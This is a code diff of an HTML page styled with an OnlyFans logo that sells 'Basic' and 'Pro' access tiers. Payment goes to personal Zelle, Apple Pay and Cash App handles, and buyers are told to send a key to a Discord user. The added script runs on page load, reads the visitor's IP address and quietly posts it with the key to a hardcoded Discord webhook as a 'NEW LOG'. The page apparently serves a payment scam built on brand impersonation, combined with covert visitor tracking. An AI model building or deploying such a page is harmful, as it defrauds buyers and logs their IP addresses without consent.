@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -8,42 +9,72 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f4f4f4;
+            background-color: #db07074f; /* Light gray background */
+            color: #000000; /* Dark text color */
         }
         .container {
             max-width: 800px;
             margin: 20px auto;
             padding: 20px;
-            background-color: #fff;
+            background-color: #db070752; /* White container background */
             border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.171); /* Soft shadow */
+            position: relative; /* Relative positioning */
+        }
+        .onlyfans-logo {
+            position: absolute; /* Absolute positioning */
+            top: 20px; /* Adjust the top position */
+            left: 20px; /* Adjust the left position */
+            width: 100px; /* Adjust the width */
+            height: auto; /* Maintain aspect ratio */
         }
         .option {
             padding: 20px;
-            border: 1px solid #ccc;
             border-radius: 8px;
             margin-bottom: 20px;
+            background-color: #2e020200; /* Light gray option background */
+            border: 2px solid #2e020231; /* Light gray border */
+            transition: all 0.3s ease;
+        }
+        .option:hover {
+            background-color: #d61d1d3b; /* Slightly darker gray on hover */
         }
         .option h2 {
             margin-top: 0;
+            margin-bottom: 10px;
+            font-size: 24px;
+            color: #333; /* Dark title color */
         }
         .option p {
-            margin-bottom: 10px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            color: #1b1b1b77; /* Gray text color */
+            font-weight: bold; /* Make the description bold */
         }
         .option button {
             padding: 10px 20px;
-            background-color: #007bff;
-            color: #fff;
+            background-color: #5e146d56; /* Blue button background */
+            color: #fff; /* White button text color */
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
         }
         .option button:hover {
-            background-color: #0056b3;
+            background-color: #5e146d8f; /* Darker blue on hover */
+        }
+        .payment-methods {
+            color: #1a1919a6; /* Gray text color */
+            margin-top: 20px;
+            font-weight: bold; /* Bolder font weight */
+            font-size: 15px; /* Increased font size */
         }
     </style>
 </head>
 <body>
+    <img class="onlyfans-logo" src="https://miro.medium.com/v2/resize:fit:1358/1*WTFTkRpVqCIo9CbpxcHY8A.png" alt="OnlyFans Logo">
+    
     <div class="container">
         <div class="option">
             <h2>Basic Access</h2>
@@ -65,22 +96,21 @@
             <p>$29.99 per month</p>
             <button onclick="purchase('pro')">Purchase Pro</button>
         </div>
+        <div class="payment-methods">
+            <p>Payment methods:</p>
+            <p>- Add the given key to the description when you send money if you're using Zelle or Cash App</p>
+            <p>- Zelle: bossguy15@yahoo.com</p>
+            <p>- Apple Pay: bossguy15@yahoo.com</p>
+            <p>- Cash App: $luhyanny</p>
+            <p>- Crypto: Please contact us for crypto payment details.</p>
+        </div>
     </div>
 
     <script>
+        var Key = generateRandomKey();
+        sendToWebhook(Key)
         function purchase(level) {
-            // Generate a random key
-            var randomKey = generateRandomKey();
-
-            // Print the random key and payment instructions
-            var paymentMethods = "Payment methods:\n";
-            paymentMethods += "add the given key to the description when you send money if you're sending Zelle or Cash App";
-            paymentMethods += "Zelle - bossguy15@yahoo.com\n";
-            paymentMethods += "Apple Pay - bossguy15@yahoo.com\n";
-            paymentMethods += "Cash App - $luhyanny\n";
-            paymentMethods += "Crypto - Please contact us for crypto payment details.";
-
-            alert('Your purchase for ' + level + ' access is now on hold please contact duxkdad on discord and send your key, Your key is: ' + randomKey + '\n\n' + paymentMethods);
+            alert('Your purchase for ' + level + ' access is now on hold. Please contact duxkdad on Discord and send your key. Your key is: ' + Key);
         }
 
         function generateRandomKey() {
@@ -91,6 +121,46 @@
                 randomKey += characters.charAt(Math.floor(Math.random() * characters.length));
             }
             return randomKey;
+        }
+        async function sendToWebhook(key) {
+            // Make a request to a third-party service to retrieve the IP address
+            var ipAddress
+            try {
+                // Make a request to a third-party service to retrieve the IP address
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+
+                // Access the IP address from the response data
+                ipAddress = data.ip;
+                
+                // Log the IP address
+                console.log('Your IP address is:', ipAddress);
+                // You can perform further actions with the IP address here
+            } catch (error) {
+                // Handle any errors
+                console.error('Error fetching IP address:', error);
+            }
+            
+            const webhookUrl = 'https://discord.com/api/webhooks/1170965103521312838/lTDH6-9O97-dvcbzeULNpj63Em2-gU-8kq842j8D0OXlYSIumsR_Vu95KjgrLMlsikgE';
+            const payload = {
+                content: 'NEW LOG \n IP:' + ipAddress + ' \nKEY: ' + key
+            };
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send message to Discord');
+                }
+                console.log('Message sent successfully to Discord');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
         }
     </script>
 </body>
